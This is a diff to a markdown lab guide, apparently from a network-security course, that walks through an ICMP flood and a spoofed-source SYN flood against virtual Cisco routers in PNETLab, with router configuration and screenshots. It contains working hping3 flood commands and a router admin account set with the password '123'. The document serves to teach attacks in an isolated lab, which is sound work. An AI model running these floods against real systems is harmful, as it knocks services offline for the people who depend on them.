@@ -14,6 +14,8 @@ ___
 
 ## DOS ATTACK: ICMP Flood Attack
 
+![schema](.\blob\dos\photo_2024-11-23_17-09-01.jpg)
+
 ### Kali Configuration:
 
 1. On Kali Linux, Open Network connection window and click on Ethernet, then wired connection.
@@ -66,15 +68,20 @@ $ ping 192.168.1.10
 ```
 R1# show processes cpu
 ```
+![schema](.\blob\dos\photo_2024-11-23_17-08-52.jpg)
 - From kali linux:
 ```
 $ hping3 -1 --flood -1 192.168.1.10
 ```
+![schema](.\blob\dos\photo_2024-11-23_17-08-35.jpg)
+
 $note:$ if we run this commad for more than 2 minutes, the target device will go down.
 
 - The check the router cpu performance again:
 
-- From kali wireshark or the embedded one on pnetlab we could observe huge amount of ECHO was sent to the target device:
+![schema](.\blob\dos\photo_2024-11-23_17-08-57.jpg)
+
+- From kali wireshark or the embedded one on pnetlab we could observe huge amount of ECHO was sent to the target device.
 
 - From router:
 ```
@@ -86,8 +93,56 @@ R1# u all
 ___
 
 ## DDOS attack: SYN Flood Attack
+![schema1](.\blob\ddos\photo_2024-11-23_17-10-33.jpg)
+- First we config the router:
 
+```
+Router> en
+Router#
+Router# config t "or terminal"
+Router(config)#
+Router(config)# hostname SRV
+SRV(config)#
+SRV(config)# interface f0/0
+SRV(config-if)#
+SRV(config-if)# ip address dhcp
+SRV(config-if)# no shutdown
+SRV(config-if)# exit
+SRV(config)# ip http ser
+SRV(config)# ip http authentication local
+SRV(config)# username admin privilege 15 password 123
+SRV(config)# do wr
+SRV(config)# ^Z (ctrl + Z)
+SRV# show ip
 
+```
+- Let's find out our kali linux ip:
+    ```
+    $ sudo su
+    ```
+    then : 
+    ```
+    $ ifconfig
+    ```
+- now we can access the SRV throuhg browser:
+
+![schema2](.\blob\ddos\photo_2024-11-23_17-10-25.jpg)
+
+- If we check wireshark we could capture syn , [syn, ack], and ack as the three way handshaking of TCP:
+![schema3](.\blob\ddos\SYN-ACK.png)
+
+- Now we are ready to attack:
+```
+hping3 -c 15000 -d 120 -w 64 -p 80 --flood --rand-source 192.168.128.140 
+```
+
+- The results are shown below:
+
+![schema4](.\blob\ddos\photo_2024-11-23_17-10-40.jpg)
+![schema5](.\blob\ddos\photo_2024-11-23_17-10-43.jpg)
+![schema6](.\blob\ddos\photo_2024-11-23_17-10-47.jpg)
+- Now if we stop the attack after a few seconds, SRV is back to normal again. (pay attention to the time!):
+![schema7](.\blob\ddos\photo_2024-11-23_17-10-51.jpg)
 
 ___
 
